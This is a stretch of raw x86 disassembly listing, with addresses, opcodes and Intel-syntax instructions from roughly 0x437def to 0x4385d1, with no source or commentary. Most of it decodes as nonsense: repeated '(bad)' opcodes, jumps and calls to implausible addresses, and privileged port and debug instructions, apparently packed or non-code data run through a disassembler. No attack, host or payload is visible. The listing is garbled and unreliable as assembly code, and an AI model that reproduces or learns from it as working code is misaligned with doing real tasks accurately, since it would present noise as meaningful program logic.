  437def:	jnp    0x437dfa
  437df1:	or     al,0xe7
  437df3:	add    ecx,DWORD PTR [eax+0x6c1cf945]
  437df9:	lods   eax,DWORD PTR ds:[esi]
  437dfa:	add    BYTE PTR [ecx-0xe],bl
  437dfd:	sti    
  437dfe:	(bad)  
  437dff:	call   0xd02f4fb3
  437e04:	in     eax,0x53
  437e06:	test   DWORD PTR [ecx+0x4d437c1e],esi
  437e0c:	jo     0x437e0b
  437e0e:	(bad)  
  437e0f:	xchg   ecx,eax
  437e10:	sbb    BYTE PTR [ebp-0x7],dh
  437e13:	jb     0x437e5b
  437e15:	push   cs
  437e16:	xchg   BYTE PTR [ecx-0x52],ch
  437e19:	adc    BYTE PTR [eax],al
  437e1b:	jmp    0x62527c8e
  437e20:	stos   DWORD PTR es:[edi],eax
  437e21:	pop    esi
  437e22:	inc    eax
  437e24:	add    BYTE PTR [eax],al
  437e26:	add    BYTE PTR [eax],al
  437e28:	add    dl,dl
  437e2a:	jge    0x437ea4
  437e2c:	cmc    
  437e2d:	pop    ebp
  437e2e:	retf   0x6307
  437e31:	inc    esi
  437e32:	lods   eax,DWORD PTR ds:[esi]
  437e33:	adc    ch,cl
  437e35:	jbe    0x437dc1
  437e37:	adc    al,0xf6
  437e39:	cmp    eax,0x76d7bc92
  437e3e:	add    al,BYTE PTR [ebp+0x51750a74]
  437e44:	aad    0x47
  437e46:	adc    ah,BYTE PTR [esi]
  437e48:	mov    bl,0x8f
  437e4a:	inc    ebp
  437e4b:	jmp    0x8bb042c2
  437e50:	cmp    eax,0x79877283
  437e55:	mov    ch,0xf
  437e57:	add    cl,ch
  437e59:	repz sar bl,1
  437e5c:	inc    edi
  437e5d:	call   0x7723371b
  437e62:	add    ah,ch
  437e64:	or     DWORD PTR [edi+0x7f],ebx
  437e67:	mov    eax,0x273ad
  437e6c:	pop    es
  437e6d:	ret    0x8561
  437e70:	popa   
  437e71:	xor    eax,0x5ce90011
  437e76:	std    
  437e77:	mov    bh,0x0
  437e79:	mov    ah,0x18
  437e7b:	add    BYTE PTR [eax],al
  437e7d:	dec    edi
  437e7e:	push   ebx
  437e7f:	icebp  
  437e80:	mov    DWORD PTR [edx+eax*2-0x7ae3fff2],edx
  437e87:	mov    BYTE PTR [edx+eiz*1+0x830000],bh
  437e8e:	add    BYTE PTR [eax],al
  437e90:	add    BYTE PTR [eax],al
  437e92:	dec    esi
  437e93:	stc    
  437e94:	jp     0x437e8f
  437e96:	adc    eax,0xc1895102
  437e9b:	jecxz  0x437efa
  437e9d:	shr    DWORD PTR [esi-0x7af7b77d],cl
  437ea3:	dec    ecx
  437ea4:	frstor [esi-0x2b]
  437ea7:	(bad)  
  437ea8:	mov    eax,0x82ffdc16
  437ead:	push   eax
  437eae:	loopne 0x437e35
  437eb0:	cmp    BYTE PTR [eax-0x7800001e],0xe0
  437eb7:	push   cs
  437eb8:	add    DWORD PTR [ebp+0x70],0xfffffffd
  437ebc:	push   edi
  437ebd:	adc    al,0x47
  437ebf:	jbe    0x437ece
  437ec1:	mov    bl,BYTE PTR [esi*4-0x7b63fff2]
  437ec8:	dec    eax
  437ec9:	or     BYTE PTR [edx+ebx*1],dl
  437ecc:	pop    es
  437ecd:	mov    ebx,DWORD PTR [ebx+esi*4]
  437ed0:	push   cs
  437ed1:	add    BYTE PTR [esp+eax*4+0x579dec75],cl
  437ed8:	or     eax,0xc2258cb1
  437edd:	data16 fcomip st,st(0)
  437ee0:	jp     0x437ea4
  437ee2:	ret    
  437ee3:	xchg   BYTE PTR [eax-0xad44],dl
  437ee9:	gs aad 0xb7
  437eec:	mov    eax,0xe2ff4c16
  437ef1:	adc    esi,DWORD PTR [edx-0x35]
  437ef4:	fldenv [esi+0x0]
  437ef7:	add    BYTE PTR [eax],al
  437ef9:	add    BYTE PTR [eax],al
  437efb:	jne    0x437f5f
  437efd:	lea    edi,[eax+0x7cfd6963]
  437f03:	xor    al,0x64
  437f05:	mov    WORD PTR [eax-0x2b507],cs
  437f0b:	(bad)  
  437f0c:	sbb    eax,0xe2472d78
  437f11:	imul   ebx
  437f13:	clc    
  437f14:	xor    eax,edi
  437f16:	or     esp,ebx
  437f18:	out    dx,al
  437f19:	cld    
  437f1a:	push   DWORD PTR [ebp+0x24]
  437f1d:	enter  0x76f7,0x69
  437f21:	std    
  437f22:	dec    DWORD PTR [esi]
  437f24:	pop    ebx
  437f25:	cmp    ch,bh
  437f27:	and    BYTE PTR [ebx-0x44],0x2
  437f2b:	jne    0x437f96
  437f2d:	std    
  437f2e:	shl    BYTE PTR [eax],0x31
  437f31:	add    al,BYTE PTR [eax]
  437f33:	jne    0x437f9e
  437f35:	push   0xc
  437f37:	sbb    al,0x5c
  437f39:	std    
  437f3a:	push   DWORD PTR [ebp+0x24]
  437f3d:	enter  0x71f7,0x69
  437f41:	std    
  437f42:	push   esi
  437f44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  437f45:	ins    DWORD PTR es:[edi],dx
  437f46:	add    al,0x8c
  437f48:	xchg   esi,eax
  437f49:	gs or  eax,edi
  437f4c:	or     al,0x7b
  437f4e:	stc    
  437f4f:	stos   BYTE PTR es:[edi],al
  437f50:	sbb    edi,0x54
  437f53:	out    dx,al
  437f54:	inc    ebp
  437f55:	fnstcw WORD PTR [ecx+ebp*4-0x3e33af5c]
  437f5c:	xor    eax,0xec8b
  437f61:	add    BYTE PTR [eax],al
  437f63:	add    BYTE PTR [eax+eiz*8],ah
  437f66:	rol    BYTE PTR [edi],0xee
  437f69:	jmp    0x2d4:0x697512bf
  437f70:	jb     0x437f2c
  437f72:	jg     0x437f6d
  437f74:	ret    0xfcf4
  437f77:	push   DWORD PTR [ebp+0x2]
  437f7a:	out    0x84,eax
  437f7c:	(bad)  
  437f7d:	(bad)  
  437f7e:	sbb    dl,bl
  437f80:	aam    0x7d
  437f82:	mov    bh,0xea
  437f84:	cmp    DWORD PTR [ebp+0x5e],esp
  437f87:	shl    BYTE PTR [esi+0x7b],cl
  437f8a:	sub    al,0x80
  437f8c:	xlat   BYTE PTR ds:[ebx]
  437f8d:	sti    
  437f8e:	push   eax
  437f8f:	mov    esp,0x8ce70287
  437f94:	(bad)  
  437f95:	cli    
  437f96:	pop    esp
  437f97:	mov    bl,ch
  437f99:	sbb    bh,ah
  437f9b:	add    ebp,ebp
  437f9d:	push   es
  437f9e:	clc    
  437f9f:	add    ch,BYTE PTR [edi-0x3d65a2ea]
  437fa5:	sbb    bh,ah
  437fa7:	add    edi,eax
  437fa9:	lock fimul DWORD PTR [edi+ebp*4-0x11389206]
  437fb1:	jp     0x437f8e
  437fb3:	adc    al,dh
  437fb5:	cwde   
  437fb6:	imul   ebx,DWORD PTR [edx],0x75
  437fb9:	add    ch,al
  437fbb:	loope  0x437f43
  437fbd:	mov    bl,0xf7
  437fbf:	sub    eax,0x6c35e8bb
  437fc4:	dec    eax
  437fc5:	inc    esp
  437fc6:	adc    al,0x8b
  437fc8:	add    BYTE PTR [eax],al
  437fca:	add    BYTE PTR [eax],al
  437fcc:	add    bh,ah
  437fce:	scas   al,BYTE PTR es:[edi]
  437fcf:	fld    DWORD PTR [ebx]
  437fd1:	jne    0x437fbb
  437fd3:	outs   dx,DWORD PTR ds:[esi]
  437fd4:	mov    ch,ch
  437fd6:	sbb    bh,ah
  437fd8:	add    edx,DWORD PTR [eax-0x6aab7eeb]
  437fde:	call   0x192109d2
  437fe3:	out    0x3,eax
  437fe5:	adc    BYTE PTR [ebx-0x14],al
  437fe8:	mov    bh,bh
  437fea:	scas   al,BYTE PTR es:[edi]
  437feb:	icebp  
  437fec:	add    esi,DWORD PTR [ebp+0x7d]
  437fef:	sub    al,0x10
  437ff1:	lock cmp BYTE PTR [ebx+0x19],0x75
  437ff6:	add    al,BYTE PTR [eax]
  437ff8:	and    eax,esi
  437ffa:	js     0x438001
  437ffc:	das    
  437ffd:	aas    
  437ffe:	jecxz  0x437f84
  438000:	mov    ecx,0x72de3e4c
  438005:	and    al,0x15
  438007:	xchg   DWORD PTR [esi*8-0x188f91d],ebp
  43800e:	adc    eax,DWORD PTR [eax]
  438010:	jmp    0x734b53fe
  438015:	cld    
  438016:	test   eax,0x7a76e912
  43801b:	add    al,0xd8
  43801d:	ja     0x437feb
  43801f:	adc    esi,DWORD PTR [ebx-0x4]
  438022:	mov    eax,0x8776e912
  438027:	jp     0x438026
  438029:	stc    
  43802a:	mov    ebx,0x6d3b6207
  43802f:	mov    ch,bl
  438031:	add    BYTE PTR [eax],al
  438033:	add    BYTE PTR [eax],al
  438035:	add    BYTE PTR [ebp-0x79],ah
  438038:	xchg   edx,eax
  438039:	jge    0x437fc7
  43803b:	add    al,BYTE PTR [eax]
  43803d:	call   0xd9f29516
  438042:	nop
  438043:	dec    eax
  438044:	bound  edi,QWORD PTR [edx]
  438046:	dec    esi
  438047:	out    dx,eax
  438048:	mov    ebp,0xbc93ff14
  43804d:	push   DWORD PTR [esi+0x2]
  438050:	bound  esp,QWORD PTR [eax-0x14]
  438053:	test   eax,0x6776e912
  438058:	or     eax,0x62624987
  43805d:	loopne 0x43805b
  43805f:	test   eax,0xef76e912
  438064:	mov    esi,0xbc7be9ec
  438069:	div    DWORD PTR [esi+0x2]
  43806c:	test   DWORD PTR [ecx+eiz*2],ebp
  43806f:	xchg   DWORD PTR [edx+0x26b8d],ecx
  438075:	add    BYTE PTR [edi],cl
  438077:	(bad)  
  438078:	sti    
  438079:	xor    DWORD PTR ds:0xba567613,0x7b
  438080:	shl    BYTE PTR [esi-0x1],1
  438083:	in     al,0x82
  438085:	dec    esi
  438086:	pop    eax
  438087:	jg     0x4380c6
  438089:	cld    
  43808a:	jp     0x438089
  43808c:	lea    edi,[eax-0x74fffbb6]
  438092:	mov    bh,dh
  438094:	add    DWORD PTR [esi+0x18b4],0x0
  43809e:	add    BYTE PTR [edx+edi*8+0xa820108],ah
  4380a5:	adc    BYTE PTR [esi+0x1865],0xa7
  4380ac:	jo     0x4380bb
  4380ae:	mov    esp,edx
  4380b0:	sti    
  4380b1:	add    BYTE PTR [ebp-0x60],0x7e
  4380b5:	adc    al,0xf
  4380b7:	xchg   edi,eax
  4380b8:	cwde   
  4380b9:	mov    esp,0xf9040c16
  4380be:	pop    ebp
  4380bf:	enter  0x10b6,0x2a
  4380c3:	xchg   esi,eax
  4380c4:	push   0xc44fe8cc
  4380c9:	xrelease mov DWORD PTR [edx+0x42],ebx
  4380cd:	push   cs
  4380ce:	add    ah,bl
  4380d0:	add    BYTE PTR gs:[esi+0x1824],0x77
  4380d8:	adc    ebx,DWORD PTR [esi-0x2d]
  4380db:	ins    BYTE PTR es:[edi],dx
  4380dc:	push   0x18348602
  4380e1:	add    BYTE PTR [eax],al
  4380e3:	pop    ds
  4380e4:	lds    eax,FWORD PTR [ebx]
  4380e6:	mov    DWORD PTR [edx+0x42],eax
  4380e9:	push   cs
  4380ea:	add    BYTE PTR [esp+esi*1+0x163139f7],cl
  4380f1:	pop    es
  4380f2:	mov    ?,WORD PTR [ebp-0x9]
  4380f5:	cld    
  4380f6:	push   DWORD PTR [ebp-0x1c]
  4380f9:	mov    bh,BYTE PTR [ebx+eiz*2+0x6c7cfd59]
  438100:	pop    esi
  438101:	sti    
  438102:	popa   
  438103:	add    BYTE PTR [eax],al
  438105:	add    BYTE PTR [eax],al
  438107:	add    BYTE PTR [edx-0x11],bh
  43810a:	xchg   ecx,eax
  43810b:	or     al,0xb6
  43810d:	sbb    DWORD PTR [ecx+ecx*1],eax
  438110:	and    bl,ch
  438112:	xchg   edx,eax
  438113:	jp     0x438194
  438115:	pop    ecx
  438116:	std    
  438117:	popa   
  438118:	(bad)  
  438119:	test   al,0xe3
  43811b:	int3   
  43811c:	push   edi
  43811d:	in     al,0xca
  43811f:	adc    edx,ebx
  438121:	jb     0x4380b6
  438123:	mov    eax,0x8fd598b
  438128:	jecxz  0x438100
  43812a:	mov    ah,0x12
  43812c:	jne    0x438187
  43812e:	xchg   BYTE PTR [edx+0x6d],dl
  438131:	icebp  
  438132:	sbb    BYTE PTR [edi],cl
  438134:	adc    ah,BYTE PTR [edi-0x93cf6ef]
  43813a:	mov    ebx,0x86597512
  43813f:	dec    edx
  438140:	popa   
  438141:	hlt    
  438142:	rol    BYTE PTR [edi],cl
  438144:	std    
  438145:	dec    esp
  438146:	adc    al,0x85
  438148:	add    esi,ebp
  43814a:	adc    al,BYTE PTR [eax]
  43814c:	jne    0x438138
  43814e:	or     al,0x26
  438150:	scas   eax,DWORD PTR es:[edi]
  438151:	jle    0x4381a1
  438153:	call   0x40db66
  438158:	jne    0x4381b4
  43815a:	fist   DWORD PTR [ebx]
  43815c:	neg    BYTE PTR [edx]
  43815e:	outs   dx,BYTE PTR ds:[esi]
  43815f:	(bad)  
  438160:	in     al,dx
  438161:	fidiv  WORD PTR [edx+edx*1-0x6d73a68b]
  438168:	jmp    0x1437ebb
  43816d:	add    BYTE PTR [eax],al
  43816f:	add    BYTE PTR [eax],al
  438171:	mov    ?,WORD PTR [edx]
  438173:	or     dh,BYTE PTR [edx-0x3f0cfe0e]
  438179:	push   edx
  43817a:	add    al,BYTE PTR [ecx-0x77]
  43817d:	loope  0x438106
  43817f:	push   ecx
  438180:	or     dh,BYTE PTR [ebp+0x2]
  438183:	inc    ecx
  438184:	push   ecx
  438185:	fwait
  438186:	out    0xef,eax
  438188:	xchg   ebp,eax
  438189:	sub    eax,0xe803e715
  43818e:	inc    ebx
  43818f:	out    0x8a,al
  438191:	out    dx,eax
  438192:	scas   al,BYTE PTR es:[edi]
  438193:	rol    DWORD PTR [ebx],1
  438195:	jne    0x438198
  438197:	sahf   
  438198:	cmp    esi,ecx
  43819a:	adc    ch,dl
  43819c:	(bad)  
  43819d:	stos   DWORD PTR es:[edi],eax
  43819e:	ins    DWORD PTR es:[edi],dx
  43819f:	xchg   edx,eax
  4381a0:	jge    0x43819a
  4381a2:	mov    edi,0x94efcade
  4381a7:	pop    ebx
  4381a8:	add    al,0x75
  4381aa:	add    ch,BYTE PTR [esi+0x46]
  4381ad:	sbb    eax,0x1c7d6ec0
  4381b2:	jp     0x4381d0
  4381b4:	adc    BYTE PTR [edx+0x7a8c797f],dh
  4381ba:	add    ah,bh
  4381bc:	mov    BYTE PTR [edi],dh
  4381be:	pop    ebx
  4381bf:	adc    edi,DWORD PTR [esp+edi*8+0x6d]
  4381c3:	stos   BYTE PTR es:[edi],al
  4381c4:	fdiv   st,st(1)
  4381c6:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  4381c8:	inc    eax
  4381c9:	sar    DWORD PTR [esi],0x2b
  4381cc:	push   eax
  4381cd:	mov    ecx,0xd1889c3e
  4381d2:	cmp    DWORD PTR [ebx],0x14
  4381d8:	add    BYTE PTR [eax],al
  4381da:	sub    BYTE PTR [ecx-0x3c],bh
  4381dd:	or     esp,DWORD PTR [eax-0x7c2b4ec5]
  4381e3:	jp     0x43822c
  4381e5:	push   ss
  4381e6:	jne    0x4381ea
  4381e8:	fiadd  DWORD PTR [edi+0x3e70300]
  4381ee:	cwde   
  4381ef:	add    eax,0x256e86c
  4381f4:	add    BYTE PTR [edx-0x4e],ah
  4381f7:	jno    0x43817e
  4381f9:	pop    ecx
  4381fa:	int    0x10
  4381fc:	add    cl,ch
  4381fe:	xor    DWORD PTR [ebx-0x4d03ccec],0x276ff98
  438208:	or     DWORD PTR [edi+0x703f1d42],edx
  43820e:	inc    ebx
  43820f:	jno    0x438196
  438211:	jno    0x43823d
  438213:	adc    BYTE PTR [eax],al
  438215:	jmp    0x653f5309
  43821a:	(bad)  
  43821b:	sti    
  43821c:	sub    ch,0x77
  43821f:	add    al,BYTE PTR [eax]
  438221:	out    dx,al
  438222:	add    esi,ebp
  438224:	lods   al,BYTE PTR ds:[esi]
  438225:	jmp    0x438223
  438227:	adc    DWORD PTR [eax],eax
  438229:	jmp    0xc314a9a4
  43822e:	mov    esp,0xe1ee53e8
  438233:	xor    eax,0x4fec0fad
  438238:	bound  ebx,QWORD PTR [edx-0xeb7786c]
  43823e:	add    BYTE PTR [eax],al
  438240:	add    BYTE PTR [eax],al
  438242:	add    BYTE PTR [eax],bl
  438244:	add    al,0x90
  438246:	mov    eax,ds:0xe6000260
  43824b:	enter  0xb889,0xf7
  43824f:	jbe    0x438253
  438251:	test   DWORD PTR [ecx-0x27e38576],ebx
  438257:	imul   eax,edx,0x8a28e613
  43825d:	mov    bh,0xd7
  43825f:	jbe    0x438263
  438261:	test   DWORD PTR [ecx-0xeaf7896],esi
  438267:	dec    BYTE PTR ds:0xade6620f
  43826d:	adc    ch,cl
  43826f:	jbe    0x4382dc
  438271:	inc    eax
  438272:	add    al,dl
  438274:	jns    0x4382cb
  438276:	or     BYTE PTR [ebp+0x11],ch
  438279:	and    cl,dl
  43827b:	repnz shl ebp,1
  43827e:	(bad)  
  43827f:	clc    
  438280:	sub    dh,al
  438282:	add    ax,0xb8b6
  438286:	push   ss
  438287:	pushf  
  438288:	add    bl,ah
  43828a:	adc    BYTE PTR [edx],dh
  43828c:	jge    0x4382a2
  43828e:	mov    bl,0x32
  438290:	aad    0xd9
  438292:	gs xchg ax,ax
  438295:	mov    eax,0xfb005c16
  43829a:	into   
  43829b:	aad    0x7e
  43829d:	mov    esp,0x83004c16
  4382a2:	dec    ebp
  4382a3:	lock sub ecx,DWORD PTR [eax+0xa0]
  4382aa:	add    BYTE PTR [eax],al
  4382ac:	inc    edx
  4382ad:	add    BYTE PTR [eax],al
  4382af:	bswap  esi
  4382b1:	cmp    edi,eax
  4382b3:	(bad)  
  4382b4:	jmp    0x4382ad
  4382b6:	scas   al,BYTE PTR es:[edi]
  4382b7:	mov    ebx,0xfff96c1e
  4382bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4382bd:	jle    0x43827b
  4382bf:	push   ss
  4382c0:	or     al,0x0
  4382c2:	mov    dl,0x10
  4382c4:	or     al,0x0
  4382c6:	add    BYTE PTR [ebx],ch
  4382c8:	push   ebx
  4382c9:	sub    eax,edx
  4382cb:	setp   bl
  4382ce:	stc    
  4382cf:	dec    DWORD PTR [ecx+edi*8]
  4382d2:	scas   al,BYTE PTR es:[edi]
  4382d3:	mov    bl,0xc
  4382d5:	ins    BYTE PTR es:[edi],dx
  4382d6:	stc    
  4382d7:	inc    edx
  4382d9:	jl     0x4382a9
  4382db:	data16 (bad) 
  4382dd:	in     al,0x82
  4382df:	dec    eax
  4382e0:	aam    0x61
  4382e2:	add    dl,BYTE PTR [eax+0x1064]
  4382e8:	retf   
  4382e9:	mov    cl,0x98
  4382eb:	mov    eax,0x8affffc2
  4382f0:	jne    0x43829b
  4382f2:	or     DWORD PTR [eax+0x40766a59],ecx
  4382f8:	mov    DWORD PTR [edi+ebp*4-0x68],esi
  4382fc:	in     al,dx
  4382fd:	push   ebx
  4382fe:	std    
  4382ff:	(bad)  
  438300:	out    dx,al
  438301:	mov    eax,ds:0x61458509
  438306:	test   DWORD PTR [esp+eiz*2],ebx
  438309:	lock mov WORD PTR [ebx+eiz*2+0xf8fd59],?
  438311:	add    BYTE PTR [eax],al
  438313:	add    BYTE PTR [eax],al
  438315:	xor    eax,0x4f10b46d
  43831a:	lahf   
  43831b:	(bad)  
  43831d:	arpl   si,si
  43831f:	shl    BYTE PTR ds:0x888b0c65,0x21
  438326:	dec    ebx
  438327:	std    
  438328:	call   ebx
  43832a:	loop   0x4382d8
  43832c:	mov    eax,0x59fd596b
  438331:	scas   al,BYTE PTR es:[edi]
  438332:	lock pop edi
  438334:	pop    ebx
  438335:	ss fs scas eax,DWORD PTR es:[edi]
  438338:	mov    edx,0xffc41f55
  43833d:	sub    DWORD PTR [ecx+ecx*4],0xffffffb5
  438341:	jae    0x4383a8
  438343:	std    
  438344:	(bad)  
  438345:	fimul  WORD PTR [eax-0x3]
  438348:	push   DWORD PTR [ebp+0x40]
  43834b:	pop    ebx
  43834c:	xchg   DWORD PTR [eax+0x7d5389e1],ebp
  438352:	and    BYTE PTR [ecx+0x7a],cl
  438355:	xchg   esp,eax
  438356:	fs scas al,BYTE PTR es:[edi]
  438358:	xchg   esp,eax
  438359:	mov    edi,0xf2fff964
  43835e:	icebp  
  43835f:	iret   
  438360:	out    dx,eax
  438361:	push   ebx
  438362:	or     BYTE PTR [ebx-0x7b],ah
  438365:	sub    eax,0x506df61
  43836a:	icebp  
  43836b:	push   cs
  43836c:	add    BYTE PTR [ebp+0x2],dh
  43836f:	repnz mov cl,0xed
  438372:	test   eax,0x777503f1
  438377:	mov    bh,0xf
  438379:	add    BYTE PTR [eax],al
  43837b:	add    BYTE PTR [eax],al
  43837d:	add    ch,ch
  43837f:	or     eax,0x16357af8
  438384:	repnz mov cl,0xd
  438387:	test   eax,0x777503d1
  43838c:	lahf   
  43838d:	(bad)  
  43838f:	rcr    esi,1
  438391:	mov    esi,DWORD PTR [ecx+0x11]
  438394:	outs   dx,BYTE PTR ds:[esi]
  438395:	xchg   esp,eax
  438396:	leave  
  438397:	adc    esp,edi
  438399:	add    edi,eax
  43839b:	int3   
  43839c:	(bad)  
  43839d:	jns    0x4383d4
  43839f:	push   ss
  4383a0:	cwde   
  4383a1:	adc    al,0x9b
  4383a3:	cmp    al,0x49
  4383a5:	push   ebp
  4383a6:	push   eax
  4383a7:	jle    0x4383d5
  4383a9:	jl     0x438399
  4383ab:	into   
  4383ac:	fdiv   QWORD PTR [ebx-0xe]
  4383af:	xchg   edx,eax
  4383b0:	imul   edx,DWORD PTR [edx],0x75
  4383b3:	add    cl,BYTE PTR [ecx]
  4383b5:	mov    ebp,ebp
  4383b7:	stos   BYTE PTR es:[edi],al
  4383b8:	icebp  
  4383b9:	add    esi,DWORD PTR [ebp+0x5d]
  4383bc:	out    dx,al
  4383bd:	loope  0x4383b0
  4383bf:	mov    cs,WORD PTR [ebp+0x0]
  4383c2:	jns    0x4383c6
  4383c4:	out    0xe1,eax
  4383c6:	cmp    DWORD PTR [ebp+0x1],esp
  4383c9:	or     eax,DWORD PTR ds:0x7503d9ab
  4383cf:	add    eax,0x7afa7c1c
  4383d4:	mov    ds:0x6e027512,eax
  4383d9:	sbb    BYTE PTR [esi-0x53c5a76],bh
  4383df:	jl     0x438395
  4383e1:	ja     0x4383e3
  4383e3:	add    BYTE PTR [eax],al
  4383e5:	add    BYTE PTR [eax],al
  4383e7:	cli    
  4383e8:	(bad)  
  4383e9:	ss jg  0x4383ac
  4383ec:	out    dx,al
  4383ed:	mov    esp,0xa7a92c
  4383f2:	dec    ecx
  4383f3:	test   al,0x29
  4383f5:	add    BYTE PTR [edx+0x1],ah
  4383f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4383f9:	adc    ch,cl
  4383fb:	jbe    0x4383a8
  4383fd:	adc    cl,ch
  4383ff:	jbe    0x438403
  438401:	and    eax,0x7a3b7812
  438406:	mov    ecx,0x8ffa7e94
  43840b:	inc    ecx
  43840c:	arpl   WORD PTR [ebp+0x6e46eb1],ax
  438412:	xor    ecx,ebx
  438414:	adc    al,0x0
  438416:	jmp    0xa1dc3898
  43841b:	add    al,BYTE PTR fs:[eax]
  43841e:	jb     0x43849e
  438420:	adc    eax,0x6b3ff588
  438425:	inc    eax
  438426:	cmc    
  438427:	jge    0x4383dd
  438429:	cwde   
  43842a:	add    BYTE PTR [edx+eax*1+0x12e7200],0x85
  438432:	xor    DWORD PTR [ebp+0x1de1c7a],eax
  438438:	mov    bh,BYTE PTR [edi+edi*8+0x29f90276]
  43843f:	gs cdq 
  438441:	adc    bl,al
  438443:	test   eax,0x17fcce4
  438448:	mov    ebp,0x74ef
  43844d:	add    BYTE PTR [eax],al
  43844f:	add    BYTE PTR [edx],dh
  438451:	(bad)  
  438452:	out    dx,eax
  438453:	pop    es
  438454:	out    dx,al
  438455:	mov    cl,0xb8
  438457:	fbstp  TBYTE PTR [esi+0x2]
  43845a:	in     eax,0xdd
  43845c:	adc    al,0x36
  43845e:	loop   0x43842f
  438460:	jg     0x438414
  438462:	mov    eax,0xfd0276f7
  438467:	and    edi,ebp
  438469:	jns    0x438427
  43846b:	div    DWORD PTR [esi+0x2]
  43846e:	inc    esi
  43846f:	add    BYTE PTR [ebp+0x38],ah
  438472:	cmc    
  438473:	xor    DWORD PTR [esi],0xccfff905
  438479:	ins    DWORD PTR es:[edi],dx
  43847a:	add    cl,BYTE PTR [edi]
  43847c:	dec    edx
  43847d:	scas   eax,DWORD PTR es:[edi]
  43847e:	loopne 0x4384c8
  438480:	sbb    al,0x5
  438482:	jecxz  0x438490
  438484:	inc    edi
  438485:	mov    bh,0xb8
  438487:	jmp    0xb1f17e57
  43848c:	jl     0x4384ca
  43848e:	cmp    DWORD PTR [eax],eax
  438490:	daa    
  438491:	inc    eax
  438492:	add    eax,0xaa716b0f
  438497:	add    dl,BYTE PTR [edi]
  438499:	jge    0x438457
  43849b:	push   ss
  43849c:	pushf  
  43849d:	add    al,0xb3
  43849f:	adc    BYTE PTR [esp+eax*1+0x76c32b00],bl
  4384a6:	jne    0x438498
  4384a8:	addr16 mov ebp,0x51d76075
  4384ae:	add    eax,0xaa2aeb0f
  4384b3:	data16 add BYTE PTR [eax],al
  4384b6:	add    BYTE PTR [eax],al
  4384b8:	add    bh,ah
  4384ba:	mov    bh,0x5d
  4384bc:	shr    DWORD PTR [esi],cl
  4384be:	jl     0x438508
  4384c0:	or     BYTE PTR [edx+0x4ab88ff5],bh
  4384c6:	add    al,0x0
  4384c8:	rsm    
  4384ca:	xchg   BYTE PTR [eax-0x7cfbb3ea],bh
  4384d0:	push   eax
  4384d1:	sub    BYTE PTR [esp+ebx*1+0x11],bh
  4384d5:	repz ds or eax,0x712648b
  4384dc:	mov    dh,0xc4
  4384de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4384df:	push   cs
  4384e0:	add    BYTE PTR [edi*2+0xa840850],bl
  4384e7:	or     DWORD PTR [ebx+0xeaa7c],ecx
  4384ed:	jne    0x438548
  4384ef:	jb     0x438531
  4384f1:	mov    DWORD PTR [edx+0x37bf2614],ecx
  4384f7:	dec    esi
  4384f8:	jmp    0x8bb11beb
  4384fd:	inc    ecx
  4384fe:	arpl   WORD PTR [ebp-0x79],bp
  438501:	in     eax,0xd5
  438503:	or     DWORD PTR [eax],eax
  438505:	jne    0x4384fb
  438507:	into   
  438508:	sti    
  438509:	pop    ebx
  43850a:	repnz mov ebx,0xfd5963b8
  438510:	in     al,0x8c
  438512:	in     al,0xd6
  438514:	or     edx,DWORD PTR [ebx]
  438516:	hlt    
  438517:	pop    ss
  438518:	lods   eax,DWORD PTR ds:[esi]
  438519:	sbb    ecx,DWORD PTR [ebx*2+0x62]
  438520:	add    BYTE PTR [eax],al
  438522:	ins    BYTE PTR es:[edi],dx
  438523:	sar    DWORD PTR [ebx-0x1a68aee],1
  438529:	enter  0xf1fc,0xb0
  43852d:	adc    dh,BYTE PTR [ebp+0x59]
  438530:	xchg   BYTE PTR [eax+eax*8],bh
  438533:	stc    
  438534:	mov    esp,0xd7e4753f
  438539:	pop    es
  43853a:	lock aas 
  43853c:	add    al,BYTE PTR [edx+edi*8-0x71068d5b]
  438543:	inc    ebp
  438544:	mov    al,0x58
  438546:	rcr    DWORD PTR [ecx],0x4
  438549:	test   ebp,edi
  43854b:	fmul   QWORD PTR [edx]
  43854d:	add    BYTE PTR [ebp-0x39],dh
  438550:	or     al,0x0
  438552:	jne    0x4385ad
  438554:	es icebp 
  438556:	outs   dx,BYTE PTR ds:[esi]
  438557:	xchg   DWORD PTR [edx],eax
  438559:	mov    cl,ah
  43855b:	jle    0x4385cf
  43855d:	stc    
  43855e:	fwait
  43855f:	hlt    
  438560:	outs   dx,BYTE PTR ds:[esi]
  438561:	bound  eax,QWORD PTR [esi+0x77]
  438564:	xchg   BYTE PTR [eax+0x7d],cl
  438567:	dec    DWORD PTR [edx]
  438569:	mov    al,0xcd
  43856b:	add    ecx,edi
  43856d:	add    esi,DWORD PTR [ebp-0x9]
  438570:	nop
  438571:	fwait
  438572:	mov    ebp,0xf803e70f
  438577:	icebp  
  438578:	repnz mov ecx,DWORD PTR [ecx-0x793cbdcf]
  43857f:	div    DWORD PTR [eax-0x65]
  438582:	and    dl,BYTE PTR [eax]
  438584:	out    0x3,eax
  438586:	add    BYTE PTR [eax],al
  438588:	add    BYTE PTR [eax],al
  43858a:	add    al,bh
  43858c:	icebp  
  43858d:	ror    BYTE PTR [edx+0x176efa3d],cl
  438593:	outs   dx,DWORD PTR ds:[esi]
  438594:	jnp    0x438615
  438596:	mov    bh,0x67
  438598:	add    ah,bh
  43859a:	jbe    0x4385d1
  43859c:	push   cs
  43859d:	pop    eax
  43859e:	adc    edx,DWORD PTR [ebx+0x3b]
  4385a1:	mov    DWORD PTR [edx-0x65],edx
  4385a4:	fild   QWORD PTR [edi-0x6d]
  4385a7:	fisttp QWORD PTR [edi]
  4385a9:	out    0x3,eax
  4385ab:	dec    ch
  4385ad:	lods   eax,DWORD PTR ds:[esi]
  4385ae:	jae    0x4385a0
  4385b0:	(bad)  
  4385b1:	out    dx,al
  4385b2:	mov    ah,ch
  4385b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4385b5:	icebp  
  4385b6:	add    esi,DWORD PTR [ebp+0x59]
  4385b9:	cmc    
  4385ba:	jbe    0x438628
  4385bc:	inc    cx
  4385be:	mov    eax,edi
  4385c0:	add    ch,bl
  4385c2:	add    esi,DWORD PTR [ebp-0x24]
  4385c5:	xchg   ebp,eax
  4385c6:	(bad)  
  4385c7:	xlat   BYTE PTR ds:[ebx]
  4385c8:	sti    
  4385c9:	push   esi
  4385ca:	mov    esp,0xe70267
  4385cf:	cmp    al,0xc6
  4385d1:	inc    eax
